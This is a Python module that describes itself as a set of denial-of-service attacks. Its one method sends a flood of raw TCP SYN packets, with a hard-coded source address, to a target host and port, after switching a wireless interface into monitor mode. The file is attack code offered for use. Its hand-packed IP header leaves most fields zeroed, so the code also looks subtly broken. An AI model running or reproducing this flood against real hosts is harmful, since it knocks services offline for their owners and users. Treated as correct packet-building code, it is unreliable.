#!/usr/bin/python3

"""This module contains multiple denial of service attacks."""
from interface_manager import InterfaceManager
import socket
import sys
import struct


class DenialOfService():
    """Denial of service attacks."""

    def __init__(self, interface, channel):
        """Initialize variables."""
        self.manager = InterfaceManager(interface)
        self.manager.wlan_channel(channel)
        self.manager.wlan_mode(InterfaceManager.MONITOR_MODE)

    def flood(self, target_addr, quantity, target_port=80):
        """Flood attack"""
        # create socket
        #   AF_INET = ipv4
        #   SOCK_RAW = bypass system checks
        #   IPPROTO_TCP = tcp protocol
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        # set for custom ip header
        #   IPPROTO_TCP = tcp protocol (the socket we use)
        #   IP_HDRINCL = socket will not generate ip header (if set to 1)
        s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

        # syn flag
        flags = 1 << 1

        # construct nearly empty packet:
        #   big-endian (for network)
        #   ip  header: 12B empty, 4B src_addr, 4B dst_addr
        #   tcp header: 2B empty, 2B target_port, 9B empty, 1B flags, 6B empty
        packet = struct.pack(
            '!12x4s4s2xH9xB6x',
            socket.inet_aton('192.168.0.1'),
            socket.inet_aton(target_addr),
            target_port,
            flags)

        # send the packets
        print(f'[INFO]',
              f'Sending {quantity} TCP SYN packets',
              f'to {target_addr}:{target_port}')
        for i in range(0, quantity):
            s.sendto(packet, (target_addr, target_port))
        print(f'[INFO]',
              f'Done sending {quantity} TCP SYN packets',
              f'to {target_addr}:{target_port}')
